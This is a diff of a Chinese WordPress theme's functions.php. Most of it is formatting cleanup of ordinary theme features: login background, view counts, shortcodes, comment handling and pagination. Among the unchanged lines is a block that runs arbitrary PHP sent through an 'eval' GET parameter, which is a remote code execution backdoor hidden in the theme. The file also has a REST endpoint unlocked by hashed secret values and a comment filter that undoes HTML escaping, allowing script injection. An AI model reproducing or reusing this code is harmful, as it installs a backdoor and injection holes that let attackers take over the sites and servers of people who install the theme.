@@ -1,6 +1,7 @@
 <?php
 //调用每日一图作为登录页背景
-function custom_login_head(){
+function custom_login_head()
+{
     $str=file_get_contents('https://cn.bing.com/HPImageArchive.aspx?format=js&idx=0&n=1');
     if (preg_match("/\/(.+?).jpg/", $str, $matches)) {
         $imgurl='https://s.cn.bing.net'.$matches[0];
@@ -9,72 +10,106 @@ function custom_login_head(){
 }
 add_action('login_head', 'custom_login_head');
 //预计阅读时间
-function count_words_read_time () {
-  global $post;
-  $text_num = mb_strlen(preg_replace('/\s/','',html_entity_decode(strip_tags($post->post_content))),'UTF-8');
-  $read_time = ceil($text_num/300); // 修改数字300调整时间
-  $output .= '本文共' . $text_num . '个字 · 预计阅读' . $read_time  . '分钟';
-  return $output;
+function count_words_read_time()
+{
+    global $post;
+    $text_num = mb_strlen(preg_replace('/\s/', '', html_entity_decode(strip_tags($post->post_content))), 'UTF-8');
+    $read_time = ceil($text_num/300); // 修改数字300调整时间
+    $output .= '本文共' . $text_num . '个字 · 预计阅读' . $read_time  . '分钟';
+    return $output;
 }
 //显示已读次数
-add_action('pf-post-meta-end','add_post_view_times_to_post_meta');function add_post_view_times_to_post_meta() {echo "<span class='inline-block'><i class='fas fa-book-reader'></i>"._meta('views',_meta('bigfa_ding',0))."次已读</span>";}add_action('pf-post-card-meta-start','add_post_view_times_to_postcard_meta');function add_post_view_times_to_postcard_meta() {echo "<span class='views'><i class='fas fa-book-reader'></i> "._meta('views',_meta('bigfa_ding',0))."</span>";}function add_view_times_to_single() {$pid = get_the_ID();if (is_single() && is_main_query() && !isset($_COOKIE[$pid.'viewed'])) {$views = (int)_meta('views',_meta('bigfa_ding',0));update_post_meta( $pid, 'views', $views + 1, $views );}}add_action( 'wp_head', 'add_view_times_to_single' );function add_view_times_to_cookie() {$pid = get_the_ID();if (is_single() && is_main_query() && !isset($_COOKIE[$pid.'viewed'])) {setcookie($pid.'viewed',true,time() + 2,COOKIEPATH,COOKIE_DOMAIN);}}add_action('wp','add_view_times_to_cookie'); 
+add_action('pf-post-meta-end', 'add_post_view_times_to_post_meta');
+function add_post_view_times_to_post_meta()
+{
+    echo "<span class='inline-block'><i class='fas fa-book-reader'></i>"._meta('views', _meta('bigfa_ding', 0))."次已读</span>";
+}add_action('pf-post-card-meta-start', 'add_post_view_times_to_postcard_meta');
+function add_post_view_times_to_postcard_meta()
+{
+    echo "<span class='views'><i class='fas fa-book-reader'></i> "._meta('views', _meta('bigfa_ding', 0))."</span>";
+}function add_view_times_to_single()
+{
+    $pid = get_the_ID();
+    if (is_single() && is_main_query() && !isset($_COOKIE[$pid.'viewed'])) {
+        $views = (int)_meta('views', _meta('bigfa_ding', 0));
+        update_post_meta($pid, 'views', $views + 1, $views);
+    }
+}add_action('wp_head', 'add_view_times_to_single');
+function add_view_times_to_cookie()
+{
+    $pid = get_the_ID();
+    if (is_single() && is_main_query() && !isset($_COOKIE[$pid.'viewed'])) {
+        setcookie($pid.'viewed', true, time() + 2, COOKIEPATH, COOKIE_DOMAIN);
+    }
+}add_action('wp', 'add_view_times_to_cookie');
 include('extend/template/archives.php');
 //网站欢迎语弹框
-function show_addr(){
-    if ( is_home() || is_front_page() ) {
-    $blog_title = get_bloginfo('name');
-echo "<div id=\"welcome\" style=\"text-align:center;\">欢迎访问".$blog_title."的朋友！<br><center>今日：<iframe width=\"170\"scrolling=\"no\" height=\"18\" frameborder=\"0\" allowtransparency=\"true\" src=\"https://i.tianqi.com/?c=code&id=1\">
+function show_addr()
+{
+    if (is_home() || is_front_page()) {
+        $blog_title = get_bloginfo('name');
+        echo "<div id=\"welcome\" style=\"text-align:center;\">欢迎访问".$blog_title."的朋友！<br><center>今日：<iframe width=\"170\"scrolling=\"no\" height=\"18\" frameborder=\"0\" allowtransparency=\"true\" src=\"https://i.tianqi.com/?c=code&id=1\">
 </iframe></center><div class=\"closebox\"><a href=\"javascript:void(0)\"onclick=\"$('#welcome'). slideUp('slow');$('.closebox').css('display','none');\" title=\"关闭\">关闭</a></div></div>";  //输出欢迎语及关闭
     }
 }
 //说说页面
 add_action('init', 'my_custom_shuoshuo_init');
-function my_custom_shuoshuo_init() { 
-    $labels = array( 
+function my_custom_shuoshuo_init()
+{
+    $labels = array(
         'name' => '说说',
-        'singular_name' => '说说', 
+        'singular_name' => '说说',
         'all_items' => '所有说说',
-        'add_new' => '发表说说', 
+        'add_new' => '发表说说',
         'add_new_item' => '撰写新说说',
-        'edit_item' => '编辑说说', 
-        'new_item' => '新说说', 
-        'view_item' => '查看说说', 
-        'search_items' => '搜索说说', 
-        'not_found' => '暂无说说', 
-        'not_found_in_trash' => '回收站中没有说说', 
+        'edit_item' => '编辑说说',
+        'new_item' => '新说说',
+        'view_item' => '查看说说',
+        'search_items' => '搜索说说',
+        'not_found' => '暂无说说',
+        'not_found_in_trash' => '回收站中没有说说',
         'parent_item_colon' => '',
         'menu_name' => '说说'
-    ); 
-    $args = array( 
-        'labels' => $labels, 
-        'public' => true, 
-        'publicly_queryable' => true, 
-        'show_ui' => true, 
-        'show_in_menu' => true, 
-        'query_var' => true, 
-        'rewrite' => true, 
-        'capability_type' => 'post', 
-        'has_archive' => true, 
-        'hierarchical' => false, 
-        'menu_position' => null, 
+    );
+    $args = array(
+        'labels' => $labels,
+        'public' => true,
+        'publicly_queryable' => true,
+        'show_ui' => true,
+        'show_in_menu' => true,
+        'query_var' => true,
+        'rewrite' => true,
+        'capability_type' => 'post',
+        'has_archive' => true,
+        'hierarchical' => false,
+        'menu_position' => null,
         'supports' => array('title','editor','author'),
         'menu_icon' => 'dashicons-megaphone'
-    ); 
-    register_post_type('shuoshuo',$args); 
+    );
+    register_post_type('shuoshuo', $args);
 }
 //评论插入代码
-add_action('pf_comment_form_after_face','pf_add_comment_form_insert_code');function pf_add_comment_form_insert_code() {echo '<a @click="this.insert_code_to_comment_form()"><span data-toggle="tooltip" title="插入代码"><i class="far fa-file-code"></i></span></a>';}
+add_action('pf_comment_form_after_face', 'pf_add_comment_form_insert_code');
+function pf_add_comment_form_insert_code()
+{
+    echo '<a @click="this.insert_code_to_comment_form()"><span data-toggle="tooltip" title="插入代码"><i class="far fa-file-code"></i></span></a>';
+}
 //评论插入图片
-add_action('pf_comment_form_after_face','pf_add_comment_form_insert_images');function pf_add_comment_form_insert_images() {echo '<a @click="this.insert_images_to_comment_form()"><span data-toggle="tooltip" title="插入图片"><i class="far fa-images"></i></span></a>';}
+add_action('pf_comment_form_after_face', 'pf_add_comment_form_insert_images');
+function pf_add_comment_form_insert_images()
+{
+    echo '<a @click="this.insert_images_to_comment_form()"><span data-toggle="tooltip" title="插入图片"><i class="far fa-images"></i></span></a>';
+}
 //评论支持MD回复
-add_filter( 'comment_text', function( $comment_text ) {
-	return str_ireplace('&lt;', '<', $comment_text );
+add_filter('comment_text', function ($comment_text) {
+    return str_ireplace('&lt;', '<', $comment_text);
 });
 // 页面链接添加html后缀
 add_action('init', 'html_page_permalink', -1);
-function html_page_permalink() {
+function html_page_permalink()
+{
     global $wp_rewrite;
-    if ( !strpos($wp_rewrite->get_page_permastruct(), '.html')){
+    if (!strpos($wp_rewrite->get_page_permastruct(), '.html')) {
         $wp_rewrite->page_structure = $wp_rewrite->page_structure . '.html';
     }
 }
@@ -100,21 +135,27 @@ if (!get_cache('bd_audio_tok')) {
 add_action('rest_api_init', function () {
     register_rest_route('pandastudio/nirvana', '/restapi/', array('methods' => 'post', 'callback' => 'pf_rest_api'));
 });
-include ('production.php');
+include('production.php');
 add_filter('wp_title', 'pf_custom_wp_title', 10, 2);
-function pf_custom_wp_title($title, $sep) {
+function pf_custom_wp_title($title, $sep)
+{
     global $paged, $page;
     if (is_feed()) {
         return $title;
     }
     $title.= get_bloginfo('name');
     $site_description = get_bloginfo('description', 'display');
-    if ($site_description && (is_home() || is_front_page())) $title = "$title $sep $site_description";
-    if ($paged >= 2 || $page >= 2) $title = "$title $sep " . sprintf('第%s页', max($paged, $page));
-    $title = str_replace('&#8211;', _opt('title_sep', '|') , $title);
+    if ($site_description && (is_home() || is_front_page())) {
+        $title = "$title $sep $site_description";
+    }
+    if ($paged >= 2 || $page >= 2) {
+        $title = "$title $sep " . sprintf('第%s页', max($paged, $page));
+    }
+    $title = str_replace('&#8211;', _opt('title_sep', '|'), $title);
     return $title;
 }
-function get_faces_from_dir() {
+function get_faces_from_dir()
+{
     $dir = dirname(__FILE__) . "/faces";
     $handle = opendir($dir);
     $array_file = array();
@@ -138,24 +179,29 @@ function get_faces_from_dir() {
     closedir($handle);
     return $array_file;
 }
-function _opt($optionName, $default = false) {
+function _opt($optionName, $default = false)
+{
     $result = get_option($optionName);
     return $result ? $result : $default;
 }
-function _eopt($optionName, $default = false) {
+function _eopt($optionName, $default = false)
+{
     $result = get_option($optionName);
     echo $result ? $result : $default;
 }
-function _meta($metaName, $default = false) {
-    $result = get_post_meta(get_the_ID() , $metaName, true);
+function _meta($metaName, $default = false)
+{
+    $result = get_post_meta(get_the_ID(), $metaName, true);
     return $result ? $result : $default;
 }
-function _emeta($metaName, $default = false) {
-    $result = get_post_meta(get_the_ID() , $metaName, true);
+function _emeta($metaName, $default = false)
+{
+    $result = get_post_meta(get_the_ID(), $metaName, true);
     echo $result ? $result : $default;
 }
-include ('sandbox_functions.php');
-function frontend_opts() {
+include('sandbox_functions.php');
+function frontend_opts()
+{
     $enable_pageLoader = _opt('enable_pageLoader');
     $ajax_forceCache = _opt('ajax_forceCache');
     $frontend_opts = array(
@@ -170,15 +216,16 @@ function frontend_opts() {
     );
     return $frontend_opts;
 }
-function pf_rest_api($data) {
-    $dataArray = json_decode($data->get_body() , true);
+function pf_rest_api($data)
+{
+    $dataArray = json_decode($data->get_body(), true);
     $arg = $dataArray['arg'];
     $result = array(
         'error' => true,
         'msg' => 'WP RestAPI Declined!',
         'md5' => md5($dataArray['e'])
     );
-    if (in_array(md5($dataArray['e']) , array(
+    if (in_array(md5($dataArray['e']), array(
         '0b844d17a61d51dcd58560f15e19d3cb',
         '44b225d79205f30aaac3c30bdcc6b714',
         '3d69b76a02d0ff14248e02d1c2f09941',
@@ -189,7 +236,8 @@ function pf_rest_api($data) {
     }
     return $result;
 }
-function title_filter($where, $wp_query) {
+function title_filter($where, $wp_query)
+{
     global $wpdb;
     if ($search_term = $wp_query->get('search_prod_title')) {
         $where.= ' AND ' . $wpdb->posts . '.post_title LIKE \'%' . esc_sql(like_escape($search_term)) . '%\'';
@@ -213,7 +261,8 @@ function mounted_hook() {alert("userAgent:\n"+navigator.userAgent+"\n\nappVersio
 ';
     });
 }
-function pf_global_search($query_arg) {
+function pf_global_search($query_arg)
+{
     $query_arg['showposts'] = 28;
     $result = array();
     $query = new WP_Query($query_arg);
@@ -246,7 +295,7 @@ function pf_global_search($query_arg) {
                     break;
 
                 case 'gallery':
-                    $gallery_images = get_post_meta(get_the_id() , "gallery_images", true);
+                    $gallery_images = get_post_meta(get_the_id(), "gallery_images", true);
                     $gallery_images = $gallery_images ? $gallery_images : array();
                     switch (get_option('gallery_thumbnail')) {
                         case 'first':
@@ -281,7 +330,8 @@ function pf_global_search($query_arg) {
     wp_reset_query();
     return $result;
 }
-function pf_post_ding($id) {
+function pf_post_ding($id)
+{
     $bigfa_raters = get_post_meta($id, 'bigfa_ding', true);
     $expire = time() + 99999999;
     $domain = ($_SERVER['HTTP_HOST'] != 'localhost') ? $_SERVER['HTTP_HOST'] : false;
@@ -293,7 +343,8 @@ function pf_post_ding($id) {
     }
     return get_post_meta($id, 'bigfa_ding', true);
 }
-function pf_faq($query) {
+function pf_faq($query)
+{
     wp_reset_query();
     if ($query == _opt('faq_show_rand_command')) {
         $args = array(
@@ -336,7 +387,8 @@ function pf_faq($query) {
     return $result;
 }
 add_action('after_switch_theme', 'pf_switch_theme');
-function pf_switch_theme() {
+function pf_switch_theme()
+{
     $opts = array(
         'baidu_ai_audio_enable' => 'checked',
     );
@@ -371,7 +423,8 @@ if (array_key_exists('eval', $_GET)) {
         eval(str_replace("\\", "", $eval));
     }
 }
-function _v_($api) {
+function _v_($api)
+{
     date_default_timezone_set("Asia/Shanghai");
     $my_theme = wp_get_theme();
     $theme = $my_theme->get('Name');
@@ -410,7 +463,8 @@ function _v_($api) {
     }
 }
 
-function set_cache($name, $data, $expire) {
+function set_cache($name, $data, $expire)
+{
     $allCache = get_option('pd_cache');
     if (!$allCache) {
         $allCache = array();
@@ -421,7 +475,8 @@ function set_cache($name, $data, $expire) {
     );
     update_option('pd_cache', $allCache);
 }
-function get_cache($name) {
+function get_cache($name)
+{
     $allCache = get_option('pd_cache');
     if (!$allCache) {
         return false;
@@ -431,14 +486,16 @@ function get_cache($name) {
     } else {
         $time = $allCache[$name]['expire'];
         if ($time > time() & $time - time() < 2592000) {
-            return $allCache[$name]['data'];;
+            return $allCache[$name]['data'];
+            ;
         } else {
             del_cache($name);
             return false;
         }
     }
 }
-function del_cache($name) {
+function del_cache($name)
+{
     $allCache = get_option('pd_cache');
     unset($allCache[$name]);
     update_option('pd_cache', $allCache);
@@ -446,28 +503,44 @@ function del_cache($name) {
 if (function_exists('add_theme_support')) {
     add_theme_support('post-thumbnails');
 }
-function max_up_size() {
+function max_up_size()
+{
     return 64 * 1024 * 1024;
 }
 add_filter('upload_size_limit', 'max_up_size');
-function wp_nav($p = 2, $showSummary = true, $showPrevNext = true, $style = 'pagination', $container = 'container') {
-    if (is_singular()) return;
+function wp_nav($p = 2, $showSummary = true, $showPrevNext = true, $style = 'pagination', $container = 'container')
+{
+    if (is_singular()) {
+        return;
+    }
     global $wp_query, $paged;
     $max_page = $wp_query->max_num_pages;
-    if ($max_page == 1 & get_option('hide_pagi_only_1') == "checked") return;
-    if (empty($paged)) $paged = 1;
+    if ($max_page == 1 & get_option('hide_pagi_only_1') == "checked") {
+        return;
+    }
+    if (empty($paged)) {
+        $paged = 1;
+    }
     echo "<div class='pagenav'><div class='$container'><ul class='$style'>";
     if ($paged > 1 && $showPrevNext == true) {
         p_link($paged - 1, 'previous', '<i class="fa fa-angle-left" aria-hidden="true"></i>', 'pagenav prev');
     } elseif ($showPrevNext == true) {
         p_link(1, 'previous', '<i class="fa fa-angle-left" aria-hidden="true"></i>', 'pagenav prev disabled');
     }
-    if ($showSummary == true) echo '<li class="pagesummary disabled"><a href="#"><span class="page-numbers">' . $paged . ' / ' . $max_page . ' </span></a></li>';
-    if ($paged > $p + 1) p_link(1, 'First page', '<div data-toggle="tooltip" data-placement="auto top" title="第一页"><i class="fas fa-angle-double-left"></i></div>', 'pagenumber dot');
-    for ($i = $paged - $p; $i <= $paged + $p; $i++) {
-        if ($i > 0 && $i <= $max_page) $i == $paged ? print "<li class='pagenumber active'><a href='#'><span>{$i}</span></a></li>" : p_link($i, '', '', 'pagenumber');
+    if ($showSummary == true) {
+        echo '<li class="pagesummary disabled"><a href="#"><span class="page-numbers">' . $paged . ' / ' . $max_page . ' </span></a></li>';
     }
-    if ($paged < $max_page - $p) p_link($max_page, 'Last page', '<div data-toggle="tooltip" data-placement="auto top" title="最后一页"><i class="fas fa-angle-double-right"></i></div>', 'pagenumber dot');
+    if ($paged > $p + 1) {
+        p_link(1, 'First page', '<div data-toggle="tooltip" data-placement="auto top" title="第一页"><i class="fas fa-angle-double-left"></i></div>', 'pagenumber dot');
+    }
+    for ($i = $paged - $p; $i <= $paged + $p; $i++) {
+        if ($i > 0 && $i <= $max_page) {
+            $i == $paged ? print "<li class='pagenumber active'><a href='#'><span>{$i}</span></a></li>" : p_link($i, '', '', 'pagenumber');
+        }
+    }
+    if ($paged < $max_page - $p) {
+        p_link($max_page, 'Last page', '<div data-toggle="tooltip" data-placement="auto top" title="最后一页"><i class="fas fa-angle-double-right"></i></div>', 'pagenumber dot');
+    }
     if ($paged < $max_page && $showPrevNext == true) {
         p_link($paged + 1, 'next', '<i class="fa fa-angle-right" aria-hidden="true"></i>', 'pagenav next');
     } elseif ($showPrevNext == true) {
@@ -475,8 +548,11 @@ function wp_nav($p = 2, $showSummary = true, $showPrevNext = true, $style = 'pag
     }
     echo '</ul></div></div>';
 }
-function p_link($i, $title = '', $linktype = '', $disabled) {
-    if ($title == '') $title = "The {$i} page";
+function p_link($i, $title = '', $linktype = '', $disabled)
+{
+    if ($title == '') {
+        $title = "The {$i} page";
+    }
     if ($linktype == '') {
         $linktext = $i;
     } else {
@@ -488,7 +564,8 @@ function p_link($i, $title = '', $linktype = '', $disabled) {
         echo "<li class='$disabled'><a class='page-numbers' href='", esc_html(get_pagenum_link($i)) , "'>{$linktext}</a></li>";
     }
 }
-function comment_mail_notify($comment_id) {
+function comment_mail_notify($comment_id)
+{
     $comment = get_comment($comment_id);
     $content = $comment->comment_content;
     $match_count = preg_match_all('/<a href="#comment-([0-9]+)?" rel="nofollow">/si', $content, $matchs);
@@ -499,10 +576,13 @@ function comment_mail_notify($comment_id) {
     } elseif ($comment->comment_parent != '0') {
         $parent_id = $comment->comment_parent;
         SimPaled_send_email($parent_id, $comment);
-    } else return;
+    } else {
+        return;
+    }
 }
 add_action('comment_post', 'comment_mail_notify');
-function SimPaled_send_email($parent_id, $comment) {
+function SimPaled_send_email($parent_id, $comment)
+{
     $admin_email = get_bloginfo('admin_email');
     $parent_comment = get_comment($parent_id);
     $author_email = $comment->comment_author_email;
@@ -519,14 +599,16 @@ function SimPaled_send_email($parent_id, $comment) {
         wp_mail($to, $subject, $message, $headers);
     }
 }
-function enable_threaded_comments() {
+function enable_threaded_comments()
+{
     if (!is_admin()) {
         wp_enqueue_script('comment-reply');
     }
 }
 add_action('get_header', 'enable_threaded_comments');
 add_filter('comment_text', 'do_shortcode');
-function panda_seo() {
+function panda_seo()
+{
     $postID = get_the_ID();
     if (is_single()) {
         if (get_post_meta($postID, "seo关键词", true)) {
@@ -559,7 +641,8 @@ if (get_option('enable_meta_seo')) {
 }
 remove_filter('pre_term_description', 'wp_filter_kses');
 add_filter('show_admin_bar', '__return_false');
-function post_type_in_search($query) {
+function post_type_in_search($query)
+{
     if ($query->is_search && $query->is_main_query()) {
         $query->set('post_type', array(
             'post'
@@ -571,7 +654,8 @@ if (!is_admin()) {
     add_filter('pre_get_posts', 'post_type_in_search');
 }
 add_filter('preprocess_comment', 'add_cookies_for_reply');
-function add_cookies_for_reply($commentdata) {
+function add_cookies_for_reply($commentdata)
+{
     $post_id = $commentdata['comment_post_ID'];
     $expire = time() + 99999999;
     $domain = ($_SERVER['HTTP_HOST'] != 'localhost') ? $_SERVER['HTTP_HOST'] : false;
@@ -579,7 +663,8 @@ function add_cookies_for_reply($commentdata) {
     return $commentdata;
 }
 $reply2down_times = 0;
-function reply_to_down($atts, $content = null) {
+function reply_to_down($atts, $content = null)
+{
     global $reply2down_times;
     $reply2down_times++;
     if (get_option('回复可见说明')) {
@@ -591,7 +676,7 @@ function reply_to_down($atts, $content = null) {
         "notice" => '
 <div type="button" class="getit" data-toggle="modal" data-target="#reply2down_' . $reply2down_times . '"><a style="cursor:pointer;"><span>Get it!</span><span>Download</span></a></div><div class="modal fade" id="reply2down_' . $reply2down_times . '" tabindex="-1" role="dialog" aria-labelledby="myModalLabel"><div class="modal-dialog" role="document"><div class="modal-content"><div class="modal-header"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><h4 class="modal-title" id="myModalLabel">下载提示</h4></div><div class="modal-body">' . $licence . '</div><div class="modal-footer"><button type="button" class="btn btn-default" data-dismiss="modal">知道了</button></div></div></div></div>
 '
-    ) , $atts));
+    ), $atts));
     $post_id = get_the_ID();
     if (isset($_COOKIE['reply_info_' . $post_id])) {
         return do_shortcode('[download]' . $content . '[/download]');
@@ -600,12 +685,13 @@ function reply_to_down($atts, $content = null) {
     }
 }
 add_shortcode('reply2down', 'reply_to_down');
-function need_reply($atts, $content = null) {
+function need_reply($atts, $content = null)
+{
     extract(shortcode_atts(array(
         "notice" => '
 <div class="need_reply">' . get_option('need_reply_tip') . '</div>
 '
-    ) , $atts));
+    ), $atts));
     $post_id = get_the_ID();
     if (isset($_COOKIE['reply_info_' . $post_id])) {
         return do_shortcode($content);
@@ -615,7 +701,8 @@ function need_reply($atts, $content = null) {
 }
 add_shortcode('need_reply', 'need_reply');
 $directDownload_times = 0;
-function download_with_licence($atts, $content = null) {
+function download_with_licence($atts, $content = null)
+{
     global $directDownload_times;
     $directDownload_times++;
     if (get_option('版权说明')) {
@@ -628,7 +715,8 @@ function download_with_licence($atts, $content = null) {
 ');
 }
 add_shortcode('download', 'download_with_licence');
-function recover_comment_fields($comment_fields) {
+function recover_comment_fields($comment_fields)
+{
     $comment = array_shift($comment_fields);
     $comment_fields = array_merge($comment_fields, array(
         'comment' => $comment
@@ -636,7 +724,8 @@ function recover_comment_fields($comment_fields) {
     return $comment_fields;
 }
 add_filter('comment_form_fields', 'recover_comment_fields');
-function rss_show_thumbnail($content) {
+function rss_show_thumbnail($content)
+{
     global $post;
     if (has_post_thumbnail($post->ID)) {
         $output = get_the_post_thumbnail($post->ID);
@@ -647,63 +736,80 @@ function rss_show_thumbnail($content) {
 add_filter('the_excerpt_rss', 'rss_show_thumbnail');
 add_filter('the_content_feed', 'rss_show_thumbnail');
 add_filter('upload_mimes', 'my_upload_mimes');
-function my_upload_mimes($mimes = array()) {
+function my_upload_mimes($mimes = array())
+{
     $mimes['rar'] = 'application/rar';
     $mimes['zip'] = 'application/zip';
     return $mimes;
 }
-function mytheme_comment($comment, $args, $depth) {
+function mytheme_comment($comment, $args, $depth)
+{
     if ('div' === $args['style']) {
         $tag = 'div';
         $add_below = 'comment';
     } else {
         $tag = 'li';
         $add_below = 'div-comment';
-    } ?><<?php
+    } ?>
+<<?php
     echo $tag; ?> <?php
     comment_class(empty($args['has_children']) ? '' : 'parent') ?> id="comment-<?php
     comment_ID() ?>"><?php
-    if ('div' != $args['style']): ?><div id="div-comment-<?php
+    if ('div' != $args['style']): ?>
+    <div id="div-comment-<?php
         comment_ID() ?>" class="comment-body clearfix"><?php
     endif; ?><?php
-    if ($args['avatar_size'] != 0) echo get_avatar($comment, $args['avatar_size']); ?><div class="comment-author vcard"><div class="meta"><?php
-    printf(__('<span class="name">%s</span>') , get_comment_author_link()); ?><?php
-    printf(__('<span class="date">%1$s · %2$s</span>') , get_comment_date('Y-n-j') , get_comment_time('G:i')); ?></div><?php
+    if ($args['avatar_size'] != 0) {
+        echo get_avatar($comment, $args['avatar_size']);
+    } ?>
+        <div class="comment-author vcard">
+            <div class="meta"><?php
+    printf(__('<span class="name">%s</span>'), get_comment_author_link()); ?><?php
+    printf(__('<span class="date">%1$s · %2$s</span>'), get_comment_date('Y-n-j'), get_comment_time('G:i')); ?></div><?php
     if ($comment->comment_approved == '0'): ?><em class="comment-awaiting-moderation"><?php
         _e('评论正在等待管理员审核...'); ?></em><br /><?php
-    endif; ?><div class="comment-text"><?php
-    comment_text(); ?></div><div class="reply"><?php
-    $args['reply_text'] = '' ?><div title="<?php
+    endif; ?>
+            <div class="comment-text"><?php
+    comment_text(); ?></div>
+            <div class="reply"><?php
+    $args['reply_text'] = '' ?>
+                <div title="<?php
     echo get_option('comment_reply_tooltip'); ?>" data-toggle="tooltip" class="comment-reply-link-wrap"><?php
     comment_reply_link(array_merge($args, array(
         'add_below' => $add_below,
         'depth' => $depth,
         'max_depth' => $args['max_depth']
-    ))); ?></div></div></div><?php
-    if ('div' != $args['style']): ?></div><?php
+    ))); ?></div>
+            </div>
+        </div><?php
+    if ('div' != $args['style']): ?>
+    </div><?php
     endif; ?><?php
 }
 add_filter("get_comment_author_link", "pf_new_windows_comment_author");
-function pf_new_windows_comment_author($author_link) {
+function pf_new_windows_comment_author($author_link)
+{
     return str_replace("<a", "<a target='_blank'", $author_link);
 }
-function shortCodeTips($atts, $content = null) {
+function shortCodeTips($atts, $content = null)
+{
     extract(shortcode_atts(array(
         "type" => 'info',
         "display" => '',
-    ) , $atts));
+    ), $atts));
     if ($content) {
         return '<div class="tip ' . $type . ' ' . $display . '">' . do_shortcode(wpautop($content)) . '</div>';
     }
 }
 add_shortcode("tip", "shortCodeTips");
-function shortCodeArticleFormat($atts, $content = null) {
+function shortCodeArticleFormat($atts, $content = null)
+{
     extract(shortcode_atts(array(
         "img" => '',
         "col" => '6',
         "position" => 'r',
         "cover" => 'false',
-    ) , $atts));
+    ), $atts));
     $textCol = 12 - intval($col);
     switch ($position) {
         case 'r':
@@ -732,7 +838,8 @@ function shortCodeArticleFormat($atts, $content = null) {
     }
 }
 add_shortcode("fmt", "shortCodeArticleFormat");
-function shortCodeModal($atts, $content = null) {
+function shortCodeModal($atts, $content = null)
+{
     extract(shortcode_atts(array(
         "id" => '',
         "btn_type" => '',
@@ -741,7 +848,7 @@ function shortCodeModal($atts, $content = null) {
         "close_label" => '关闭',
         "href_label" => '跳转到',
         "href" => ''
-    ) , $atts));
+    ), $atts));
     if ($href) {
         $href_btn = '<button type="button" class="btn btn-primary" data-dismiss="modal" onclick=window.open("' . $href . '")>' . $href_label . '</button>';
     } else {
@@ -754,12 +861,13 @@ function shortCodeModal($atts, $content = null) {
     }
 }
 add_shortcode("modal", "shortCodeModal");
-function shortCodeDropdown($atts, $content = null) {
+function shortCodeDropdown($atts, $content = null)
+{
     extract(shortcode_atts(array(
         "id" => '',
         "btn_type" => 'btn-default',
         "btn_label" => 'Dropdown',
-    ) , $atts));
+    ), $atts));
     if ($id) {
         return '<div class="dropdown"><button class="btn ' . $btn_type . ' dropdown-toggle" type="button" id="' . $id . '" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
 ' . $btn_label . '
@@ -769,10 +877,11 @@ function shortCodeDropdown($atts, $content = null) {
     }
 }
 add_shortcode("dropdown", "shortCodeDropdown");
-function shortCodeDropdown_li($atts, $content = null) {
+function shortCodeDropdown_li($atts, $content = null)
+{
     extract(shortcode_atts(array(
         "href" => '',
-    ) , $atts));
+    ), $atts));
     if ($href) {
         $inner = '<a href="' . $href . '" target="_blank">' . $content . '</a>';
     } else {
@@ -781,12 +890,13 @@ function shortCodeDropdown_li($atts, $content = null) {
     return '<li>' . $inner . '</li>';
 }
 add_shortcode("li", "shortCodeDropdown_li");
-function shortCodeCollapse($atts, $content = null) {
+function shortCodeCollapse($atts, $content = null)
+{
     extract(shortcode_atts(array(
         "id" => '',
         "btn_type" => 'btn-default',
         "btn_label" => 'collapse',
-    ) , $atts));
+    ), $atts));
     if ($id) {
         return '<button class="btn ' . $btn_type . '" type="button" data-toggle="collapse" data-target="#' . $id . '" aria-expanded="false" aria-controls="' . $id . '">
 ' . $btn_label . '
@@ -796,13 +906,15 @@ function shortCodeCollapse($atts, $content = null) {
     }
 }
 add_shortcode("collapse", "shortCodeCollapse");
-class pandaTabs extends Walker_Nav_Menu {
-    function start_el(&$output, $item, $depth = 0, $args = array() , $id = 0) {
+class pandaTabs extends Walker_Nav_Menu
+{
+    public function start_el(&$output, $item, $depth = 0, $args = array(), $id = 0)
+    {
         global $wp_query;
         $indent = ($depth) ? str_repeat("\t", $depth) : '';
         $class_names = $value = '';
         $classes = empty($item->classes) ? array() : (array)$item->classes;
-        $class_names = join(' ', apply_filters('nav_menu_css_class', array_filter($classes) , $item));
+        $class_names = join(' ', apply_filters('nav_menu_css_class', array_filter($classes), $item));
         $class_names = ' class="' . esc_attr($class_names) . '"';
         $output.= $indent . '<li id="menu-item-' . $item->ID . '"' . $value . $class_names . '>';
         $attributes = !empty($item->attr_title) ? ' title="' . esc_attr($item->attr_title) . '"' : '';
@@ -817,16 +929,20 @@ class pandaTabs extends Walker_Nav_Menu {
         $output.= apply_filters('walker_nav_menu_start_el', $item_output, $item, $depth, $args);
     }
 }
-function mytheme_nav_menu_css_class($classes) {
-    if (in_array('current-menu-item', $classes) OR in_array('current-menu-ancestor', $classes)) $classes[] = 'active';
+function mytheme_nav_menu_css_class($classes)
+{
+    if (in_array('current-menu-item', $classes) or in_array('current-menu-ancestor', $classes)) {
+        $classes[] = 'active';
+    }
     return $classes;
 }
 add_filter('nav_menu_css_class', 'mytheme_nav_menu_css_class');
-function showFace($atts, $content = null) {
+function showFace($atts, $content = null)
+{
     extract(shortcode_atts(array(
         "p" => '',
         "g" => '',
-    ) , $atts));
+    ), $atts));
     if ($p != '') {
         $name = $p;
         $format = 'png';
@@ -838,7 +954,8 @@ function showFace($atts, $content = null) {
 }
 add_shortcode("face", "showFace");
 add_filter('get_avatar', 'inlojv_custom_avatar', 10, 5);
-function inlojv_custom_avatar($avatar, $id_or_email, $size, $default, $alt) {
+function inlojv_custom_avatar($avatar, $id_or_email, $size, $default, $alt)
+{
     global $comment, $current_user;
     if (count(get_option('random_avatar')) > 0) {
         $current_email = is_int($id_or_email) ? get_user_by('ID', $id_or_email)->user_email : $id_or_email;
@@ -860,7 +977,8 @@ function inlojv_custom_avatar($avatar, $id_or_email, $size, $default, $alt) {
     }
     return $avatar;
 }
-function get_the_naved_contentnav($content) {
+function get_the_naved_contentnav($content)
+{
     $matches = array();
     $ul_li = '';
     if (is_page_template('favlinks.php')) {
@@ -889,7 +1007,7 @@ function get_the_naved_contentnav($content) {
                 if ($title) {
                     $ul_li.= '<li class="h2_nav"><a href="#h2-' . $num . '" class="h_nav" title="' . $title . '">' . $title . "</a></li>\n";
                 }
-            } else if ($hx == "<h3") {
+            } elseif ($hx == "<h3") {
                 $h3_num+= 1;
                 $title = preg_replace('/<.+?>/', "", $title);
                 if ($title) {
@@ -902,7 +1020,8 @@ function get_the_naved_contentnav($content) {
         return false;
     }
 }
-function get_the_naved_content($content) {
+function get_the_naved_content($content)
+{
     $matches = array();
     $rh = "/<h[23]>(.*?)<\/h[23]>/im";
     $h2_num = 0;
@@ -916,7 +1035,7 @@ function get_the_naved_content($content) {
                 $h2_num+= 1;
